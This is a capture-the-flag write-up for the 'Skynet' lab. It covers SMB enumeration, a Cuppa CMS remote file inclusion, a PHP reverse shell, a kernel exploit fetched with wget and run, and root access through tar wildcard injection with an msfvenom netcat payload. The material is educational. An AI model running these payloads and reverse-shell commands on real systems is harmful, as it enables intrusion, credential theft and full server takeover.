# Skynet Writeup

After running a simple nmap scan we can see there is a webserver running lets start there.
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 14:27 EST
Nmap scan report for 10.10.123.244
Host is up (0.024s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE TOP SASL RESP-CODES PIPELINING UIDL CAPA
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more SASL-IR OK IMAP4rev1 post-login ENABLE LOGIN-REFERRALS listed have ID LOGINDISABLEDA0001 Pre-login capabilities LITERAL+ IDLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/8%OT=22%CT=1%CU=33657%PV=Y%DS=2%DC=T%G=Y%TM=6202C433
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)SEQ(SP=10
OS:4%GCD=1%ISR=10E%TI=Z%TS=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11
OS:NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68D
OS:F%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)
OS:T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=
OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
OS:6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK
OS:=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-02-08T19:27:46
|_  start_date: N/A
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-02-08T13:27:46-06:00

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   26.27 ms 10.11.0.1
2   26.43 ms 10.10.123.244

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.79 seconds
```

Okay so we get some sort of searchbar which does not really do anything, so I decided to run a gobuster scan, which gave us some interesting results.

```
/js                   (Status: 301) [--> http://10.10.123.244/js/]     
/css                  (Status: 301) [--> http://10.10.123.244/css/]
/admin                (Status: 301) [--> http://10.10.123.244/admin/]
/config               (Status: 301) [--> http://10.10.123.244/config/]
/squirrelmail         (Status: 301) [--> http://10.10.123.244/squirrelmail/]
/ai                   (Status: 301) [--> http://10.10.123.244/ai/]  
```

All of them are forbidden except the ``/squirrelmail/`` which brings us to a login page, the source code doesnt look all that interesting.

I checked the hint for #1 it says 'enumerate SMB' so lets try that.

`enum4linux 10.10.123.244`

We get a couple interesting things back:
```
[+] Server 10.10.123.244 allows sessions using username '', password ''
anonymous       Disk      Skynet Anonymous Share
milesdyson      Disk      Miles Dyson Personal Share
/10.10.123.244/anonymous       Mapping: OK, Listing: OK
SKYNET\milesdyson (Local User)

```

Now that we know that we can login on `\\anonymous` with no password we can use this command: `smbclient \\\\10.10.227.86\\anonymous`

After running ls in the smb client we get the following result

```
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5831532 blocks available

```

We can now use `get file.txt` and `cd directory` to copy all the files to our machine

Okay so `log2.txt` and `log3.txt` are empty but log1.txt seems to be a password wordlist, and attention just says every employee should change password by miles.

After trying every combination of password in the new wordlist with miles nothing worked but then when i tried the password `cyborg007haloterminator` with the username milesdyson we get access to the mail page.

Miles has 3 emails as we can see 1 seems to be Binary one seems to be his new smb password and one seems to be some weird egocentric message....

Lets try decrypting the binary we just get `balls have zero to me to me to me to me to me to me to me to me to` dont think its very usefull... Lets try loging in to miles smb with the password found in the email.

Using the command `smbclient \\\\10.10.227.86\\milesdyson -U milesdyson` we get access to miles smb share, there doesnt seem to be anything usefull at first but if we navigate with `cd notes` we can see an `important.txt` file which we can download with `get important.txt` which returns the below:

```
┌──(root💀kali)-[/home/kali/Desktop/CTFs/Skynet]
└─# cat important.txt                                                             

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

As the next question in the CTF is asking about a hidden directory, i guess it must be `/45kra24zxs28v3yd`, it is the correct answer but the directory does seem to be anything interesting...

For the next question it asks what is it called when we include remote files, so that is `Remote File Inclusion` which I guess is what we have to do next.

After running gobuster we get the directory `/administrator` which includes a login page, so im guessing this is what we need to exploit next.

After running `searchsploit Cuppa` we find 1 exploit

```
┌──(root💀kali)-[/home/kali/Desktop/CTFs/Skynet]
└─# searchsploit Cuppa          
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Incl | php/webapps/25971.txt
----------------------------------------------------------- ---------------------------------
```

Which we can download using `searchsploit -m php/webapps/25971.txt` and after reading the file we get instructions:

```
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /
  / XXXXXX /
 (________(
  `------'

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22:
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------


#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------

Base64 Encode Output:
-----------------------------------------------------------------------------
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
-----------------------------------------------------------------------------

Base64 Decode Output:
-----------------------------------------------------------------------------
<?php
        class Configuration{
                public $host = "localhost";
                public $db = "cuppa";
                public $user = "root";
                public $password = "Db@dmin";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "";
                public $secure_login_redirect = "";
        }
?>
-----------------------------------------------------------------------------

Able to read sensitive information via File Inclusion (PHP Stream)

################################################################################################################
 Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################                                                     
```

So if we follow the instructions and go to: `/alerts/alertConfigField.php` we can see that it works so lets try reading sensitive data. So using `alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd` we can read the /etc/passwd file but nothing interesting is found so lets try a reverse shelll using pentest monkey, after getting the reverse shell from [Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) we can touch a revShell.php file and all we need to change is 

```
$ip = '127.0.0.1';  // CHANGE THIS TO YOUR IP
$port = 1234;       // CHANGE THIS TO 9999
```

Once we have done that we can run `python -m SimpleHTTPServer 80` to host a simple server, which can serve the revShell file. Next run the command `nc -lvp 9999` to listen for the reverse shell. Lastely just go to the url: 
`/alerts/alertConfigField.php?urlConfig=http://<YOUR IP>/revShell.php?`

Boom! We get a reverse shell, we can now navigate to `/home/milesdyson` and find the user.txt flag, we are almost there! So we can see we have a `/mail` directory which we cant access, but we can access the `/backups` which just looks like its a backup for the website files. We also have `share` which is just what we accessed earlier with smb. I then decided to run [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) by serving it on my local machine with the http server we created earlier.

After running linPEAS one specific line pops out in the Cron Jobs Section
`*/1 *   * * *   root    /home/milesdyson/backups/backup.sh` this means we can potentially edit the backup.sh file and since it will be run by root we can read the `root.txt` file. Sadly we dont have permissions.

I decide to checkout the version with `uname -a` and then I run on my Attacker Machine `searchsploit Linux 4.8` I decide to take a look at `Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)` which could give us promising results. `searchsploit -x linux/local/43418.c` which tells us how to use it running `gcc pwn.c -o pwn && ./pwn` Next I download it locally using `searchsploit -m linux/local/43418.c` and just like before we serve it with our SimpleHTTPServer and run it on the target machine using `wget http://<YOUR IP>:80/43418.c | gcc 43418.c -o 43418 && ./43418` in the `/tmp/` directory.

GG! we are root, now we can just go read the root.txt file!
Thanks for reading my writeup I hope you enjoyed! :)

Actually wait... That was just lucky that the OS wasnt updated, so lets try the hard way by exploiting the Cron task on the `backup.sh` file!

Here are the contents of the file:
```
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

After doing some searching I found this website [Wildcard tar Exploit](https://hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) which gives multiple methods on exploiting a tar file running on a cronjob. I used method #1

- run `msfvenom -p cmd/unix/reverse_netcat lhost=<YOUR IP> lport=9999 R` to build the exploit on your local machine.
- head over to /var/www/html  `cd /var/www/html`
- run `echo "<YOUR EXPLOIT>" > shell.sh` on the victim machine
- run `echo "" > "--checkpoint-action=exec=sh shell.sh"`
- Finally run `echo "" > --checkpoint=1`

Now just use `nc -lnvp 9999` to listen for the connection and after the cron job runns you will have a root shell! 

GG! We did it the right way this time, Thats all folk!
